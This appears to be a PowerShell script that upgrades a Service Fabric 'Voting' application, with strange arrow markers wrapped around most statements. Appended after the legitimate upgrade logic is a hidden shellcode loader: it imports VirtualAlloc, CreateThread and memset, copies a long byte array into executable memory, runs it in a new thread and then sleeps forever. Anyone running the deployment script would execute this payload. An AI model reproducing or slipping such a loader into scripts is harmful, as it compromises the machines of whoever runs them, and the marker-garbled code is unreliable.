
 -||-> $ApplicationPackagePath = "C:\Users\sfuser\documents\visual studio 2017\Projects\Voting\Voting\pkg\Debug" <-||- 
 -||-> $ApplicationName = "fabric:/Voting" <-||- 
 -||-> $ApplicationTypeName = "VotingType" <-||- 
 -||-> $ApplicationTypeVersion = "1.3.0" <-||- 
 -||-> $imageStoreConnectionString = "fabric:ImageStore" <-||- 
 -||-> $CopyPackageTimeoutSec = 600 <-||- 
 -||-> $CompressPackage = $false <-||- 



 -||-> $oldApplication =  -||-> Get-ServiceFabricApplication -ApplicationName $ApplicationName <-||-  <-||- 
        
 -||-> if ( -||-> !$oldApplication <-||- )
{
     -||-> $errMsg = "Application '$ApplicationName' doesn't exist in cluster." <-||- 
    throw  -||-> $errMsg <-||- 
}
else
{
    
     -||-> $upgradeStatus =  -||-> Get-ServiceFabricApplicationUpgrade -ApplicationName $ApplicationName <-||-  <-||- 
     -||-> if ( -||-> $upgradeStatus.UpgradeState -ne "RollingBackCompleted" -and $upgradeStatus.UpgradeState -ne "RollingForwardCompleted" -and $upgradeStatus.UpgradeState -ne "Failed" <-||- )
    {
         -||-> $errMsg = "An upgrade for the application '$ApplicationTypeName' is already in progress." <-||- 
        throw  -||-> $errMsg <-||- 
    } <-||- 

     -||-> $reg =  -||-> Get-ServiceFabricApplicationType -ApplicationTypeName $ApplicationTypeName | Where-Object  {  -||-> $_.ApplicationTypeVersion -eq $ApplicationTypeVersion <-||-  } <-||-  <-||- 
     -||-> if ( -||-> $reg <-||- )
    {
         -||-> Write-Host 'Application Type '$ApplicationTypeName' and Version '$ApplicationTypeVersion' was already registered with Cluster, unregistering it...' <-||- 
         -||-> $reg | Unregister-ServiceFabricApplicationType -Force <-||- 
    } <-||- 

    
     -||-> $applicationPackagePathInImageStore = $ApplicationTypeName <-||- 
     -||-> Write-Host "Copying application package to image store..." <-||- 
     -||-> Copy-ServiceFabricApplicationPackage -ApplicationPackagePath $ApplicationPackagePath -ImageStoreConnectionString $imageStoreConnectionString -ApplicationPackagePathInImageStore $applicationPackagePathInImageStore -TimeOutSec $CopyPackageTimeoutSec -CompressPackage:$CompressPackage <-||-  
     -||-> if( -||-> !$? <-||- )
    {
        throw  -||-> "Copying of application package to image store failed. Cannot continue with registering the application." <-||- 
    } <-||- 
    
    
     -||-> Write-Host "Registering application type..." <-||- 
     -||-> Register-ServiceFabricApplicationType -ApplicationPathInImageStore $applicationPackagePathInImageStore <-||- 
     -||-> if( -||-> !$? <-||- )
    {
        throw  -||-> "Registration of application type failed." <-||- 
    } <-||- 

    
     -||-> Remove-ServiceFabricApplicationPackage -ImageStoreConnectionString $imageStoreConnectionString -ApplicationPackagePathInImageStore $applicationPackagePathInImageStore <-||- 
     -||-> if( -||-> !$? <-||- )
    {
         -||-> Write-Host "Removing the application package failed." <-||- 
    } <-||- 
        
    
     -||-> try
    {
         -||-> Write-Host "Start upgrading application..." <-||-  
         -||-> Start-ServiceFabricApplicationUpgrade -ApplicationName $ApplicationName -ApplicationTypeVersion $ApplicationTypeVersion -HealthCheckStableDurationSec 60 -UpgradeDomainTimeoutSec 1200 -UpgradeTimeout 3000 -FailureAction Rollback -Monitored <-||- 
    }
    catch
    {
         -||-> Write-Host ( -||-> "Error starting upgrade. " + $_ <-||- ) <-||- 

         -||-> Write-Host "Unregister application type '$ApplicationTypeName' and version '$ApplicationTypeVersion' ..." <-||- 
         -||-> Unregister-ServiceFabricApplicationType -ApplicationTypeName $ApplicationTypeName -ApplicationTypeVersion $ApplicationTypeVersion -Force <-||- 
        throw
    } <-||- 

    do
    {
         -||-> Write-Host "Waiting for upgrade..." <-||- 
         -||-> Start-Sleep -Seconds 3 <-||- 
         -||-> $upgradeStatus =  -||-> Get-ServiceFabricApplicationUpgrade -ApplicationName $ApplicationName <-||-  <-||- 
    } while ( -||-> $upgradeStatus.UpgradeState -ne "RollingBackCompleted" -and $upgradeStatus.UpgradeState -ne "RollingForwardCompleted" -and $upgradeStatus.UpgradeState -ne "Failed" <-||- )
    
     -||-> if( -||-> $upgradeStatus.UpgradeState -eq "RollingForwardCompleted" <-||- )
    {
         -||-> Write-Host "Upgrade completed successfully." <-||- 
    }
    elseif( -||-> $upgradeStatus.UpgradeState -eq "RollingBackCompleted" <-||- )
    {
         -||-> Write-Error "Upgrade was Rolled back." <-||- 
    }
    elseif( -||-> $upgradeStatus.UpgradeState -eq "Failed" <-||- )
    {
         -||-> Write-Error "Upgrade Failed." <-||- 
    } <-||- 
} <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x02,0x53,0x4b,0x2d,0xdb,0xc7,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x57,0x83,0xc6,0x04,0x31,0x56,0x11,0x03,0x56,0x11,0xe2,0xf7,0xaf,0xa3,0xaf,0xf7,0x4f,0x34,0xd0,0x7e,0xaa,0x05,0xd0,0xe4,0xbe,0x36,0xe0,0x6f,0x92,0xba,0x8b,0x3d,0x07,0x48,0xf9,0xe9,0x28,0xf9,0xb4,0xcf,0x07,0xfa,0xe5,0x33,0x09,0x78,0xf4,0x67,0xe9,0x41,0x37,0x7a,0xe8,0x86,0x2a,0x76,0xb8,0x5f,0x20,0x24,0x2d,0xeb,0x7c,0xf4,0xc6,0xa7,0x91,0x7c,0x3a,0x7f,0x93,0xad,0xed,0x0b,0xca,0x6d,0x0f,0xdf,0x66,0x24,0x17,0x3c,0x42,0xff,0xac,0xf6,0x38,0xfe,0x64,0xc7,0xc1,0xac,0x48,0xe7,0x33,0xad,0x8d,0xc0,0xab,0xd8,0xe7,0x32,0x51,0xda,0x33,0x48,0x8d,0x6f,0xa0,0xea,0x46,0xd7,0x0c,0x0a,0x8a,0x81,0xc7,0x00,0x67,0xc6,0x80,0x04,0x76,0x0b,0xbb,0x31,0xf3,0xaa,0x6c,0xb0,0x47,0x88,0xa8,0x98,0x1c,0xb1,0xe9,0x44,0xf2,0xce,0xea,0x26,0xab,0x6a,0x60,0xca,0xb8,0x07,0x2b,0x83,0x50,0x72,0xa0,0x53,0xc5,0x0b,0x21,0x3a,0x7c,0xa7,0xd9,0x8e,0x09,0x61,0x1d,0xf0,0x23,0x5c,0xfa,0x5d,0x9f,0xcd,0xaf,0x32,0x77,0xcb,0x19,0xcc,0x20,0xd4,0x73,0x7d,0x7c,0x40,0x7f,0xd1,0xd1,0xfc,0xc4,0xd4,0xd5,0xfc,0xd2,0x5b,0xd5,0xfc,0x22,0x4b,0xa2,0xaf,0x12,0xa7,0x7b,0x4f,0x03,0xaf,0x2c,0xc6,0x3c,0xe9,0x2c,0x0d,0xcb,0x30,0x81,0xc5,0xcc,0x8e,0xc6,0x91,0x9e,0xbd,0x55,0xce,0x73,0x14,0x32,0x1b,0x26,0xb6,0xf9,0x24,0x1c,0x50,0x97,0xd0,0xc0,0x35,0xe8,0xd7,0xfe,0xc5,0x61,0xf7,0x95,0xc1,0x21,0x9d,0x76,0x9c,0xa9,0x14,0xcf,0xbe,0xac,0x29,0x1a,0xed,0xe3,0x86,0xf6,0x44,0x6c,0x05,0xff,0x70,0x17,0xaa,0x2a,0x05,0x27,0x21,0xdf,0x49,0xdd,0x10,0xb7,0xa5,0xa8,0x00,0x1e,0xb9,0x06,0x2e,0xdf,0x2d,0xa9,0xbe,0xdf,0xad,0xc1,0xbe,0xdf,0xed,0x11,0xed,0xb7,0xb5,0xb5,0x42,0xad,0xb9,0x63,0xf7,0x7e,0x15,0x05,0x10,0xd7,0xf1,0x15,0xfe,0xd8,0x01,0x45,0xa8,0xb0,0x13,0xff,0xdd,0xa3,0xeb,0x2a,0x58,0xe3,0x60,0x18,0xe9,0xe3,0x89,0x61,0x68,0x2b,0xfc,0x80,0x2a,0x6f,0xa0,0xa2,0xbf,0x90,0xa0,0xcc,0x0e,0x56,0x6d,0x1d,0x41,0x9e,0xa9,0x4f,0x90,0xee,0xf1,0xa1,0xe0,0x3e,0x34,0xbe <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



